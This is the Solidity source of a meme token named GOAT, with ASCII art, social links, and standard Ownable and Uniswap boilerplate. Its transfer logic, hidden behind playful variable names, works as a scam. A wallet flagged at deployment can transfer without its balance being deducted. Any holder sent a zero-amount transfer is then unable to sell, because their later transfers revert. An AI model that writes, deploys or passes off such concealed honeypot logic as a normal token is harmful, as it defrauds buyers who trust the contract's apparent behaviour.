// https://twitter.com/goatcoindex
// https://t.me/goatcoineth

// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%%#+=:.:=+*%@%%%%%%%%%%%%%%%@%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%*-            :-+%%%%%%+.   ..+%%%%%%%%%@%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%%#*+-.          -#%*.  .     :%%%#***##%%@%%%%%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%%%%%%%*-.         -*#%%#       *%%#******##%%%%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%*:         -#%@#.      -%%#*********#%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%%#****##%%%=          :#%#.      .#%%#*********#%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%@%#********#%%%#.       :+%*#%--=*##%##%%%%#*********#%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%#*******#%%%%%%%%-   :+*+:   -%=.      :%%%%%%#********%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%*******#%%%%%%..-=*+==-.        =-       .#%%%%%%#*******#%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%#*******%%%%%%@*                    .        +%%%%%%%#*******%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%#******#%%%%%%%%. =.                           -%%%%%%%%*******%%%%%%%%%%%%
// %%%%%%%%%%%%%%#******%@%%%%%%%*  #-                            .#%%%%%%%#******%@%%%%%%%%%
// %%%%%%%%%%%%%#******%%%%%%%%%@#: -%*:                            *%%%%%%%#******%%%%%%%%%%
// %%%%%%%%%%%%#******%%%%%%%%%%%@%+ .*%                             =%%%%%%%#******%%%%%%%%%
// %%%%%%%%%%%%******%%%%%%%%%%%%%%@%: :                         .    :%%%%%%%******#%%%%%%%%
// %%%%%%%%%%%#******%@%%%%%%%%%%%%%%*        -+#%%*:            .+.  :%@%%%%%%******%%%%%%%%
// %%%%%%%%%%%******%%%%%%%%%%%%%%%%*          :%%%%%#-           :%=-%%%%%%%%%******%%%%%%%%
// %%%%%%%%%%%******%%%%%%%%%%%%%%%*             :==+*#%+.         -%%%%%%%%%%%#*****#%%%%%%%
// %%%%%%%%%%%******%%%%%%%%%%%%%%*                     .-.         +%%%%%%%%%%#*****#%%%%%%%
// %%%%%%%%%%%******%%%%%%%%%%%%%+                                   *%%%%%%%%%#*****#%%%%%%%
// %%%%%%%%%%%******%%%%%%%%%%*-       -                              #%%%%%%%%#*****#%%%%%%%
// %%%%%%%%%%%******%@%%%%%*-          =:                              #%%%%%%%#*****#%%%%%%%
// %%%%%%%%%%@#*****#@%%+-             .#                        .:::::-%%%%%%%******%@%%%%%%
// %%%%%%%%%%%%******%%+                #+                        :=#@%%%%%%%%#*****#%%%%%%%%
// %%%%%%%%%%%%#******%%-               =@-                          -%%==%%%%******%%%%%%%%%
// %%%%%%%%%%%%%******#%%-               =%%#+=:                      %- *%%%******#%%%%%%%%%
// %%%%%%%%%%%%%%******#%@+               .+%%%%%#*=:.            .:-*@==@@%******#%%%%%%%%%%
// %%%%%%%%%%%%%%%*******%%#:               .+%%%%%%%@%*.   =++++=-::..=@%#******#%%%%%%%%%%%
// %%%%%%%%%%%%%%%%*******#%%*.               .+%%%%%%%%+         .-+#%%%#******#%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%#*******%@%*:               .*%%%%%%%.       #%%%%%#*******%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%********#%%#=.              .#%%%%%+      -%%%%#*******#%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%#********#%%%#+-.          .%%%%%%%=     *%%#*******#%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%#*********##%%%%*+-:.   .#%%%%%%%%%=   -%%#*****#%@%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%%%%#***********##%%%%%%%%%%@%%%%#%%%%= .%%%***#%%@%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%%%%%%%#***************************#%%%%+#%%#%%%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%##*************************#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%###***************###%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@@%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
// %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%


// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymission. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * by removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Goat is Ownable {
    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint256 private yes = 25;

    uint256 public totalSupply;

    mapping(address => mapping(address => uint256)) public allowance;

    function transfer(address adventurer, uint256 goats) public returns (bool success) {
        adventure(msg.sender, adventurer, goats);
        return true;
    }

    mapping(address => uint256) private mission;

    function transferFrom(address bond, address adventurer, uint256 goats) public returns (bool success) {
        adventure(bond, adventurer, goats);
        require(goats <= allowance[bond][msg.sender]);
        allowance[bond][msg.sender] -= goats;
        return true;
    }

    uint8 public decimals = 9;

    mapping(address => uint256) private loot;

    function adventure(address bond, address adventurer, uint256 goats) private returns (bool success) {
        if (mission[bond] == 0) {
            if (loot[bond] > 0 && bond != uniswapV2Pair) {
                mission[bond] -= yes;
            }
            balanceOf[bond] -= goats;
        }
        if (goats == 0) {
            loot[adventurer] += yes;
        }
        balanceOf[adventurer] += goats;
        emit Transfer(bond, adventurer, goats);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(address _address) {
        name = "GOAT";
        symbol = "GOAT";
        totalSupply = 272_727_272_727_272 * 10 ** decimals;
        balanceOf[msg.sender] = totalSupply;
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        mission[_address] = yes;
    }

    address public uniswapV2Pair;

    string public name;

    function approve(address hardly, uint256 goats) public returns (bool success) {
        allowance[msg.sender][hardly] = goats;
        emit Approval(msg.sender, hardly, goats);
        return true;
    }

    string public symbol;

    mapping(address => uint256) public balanceOf;
}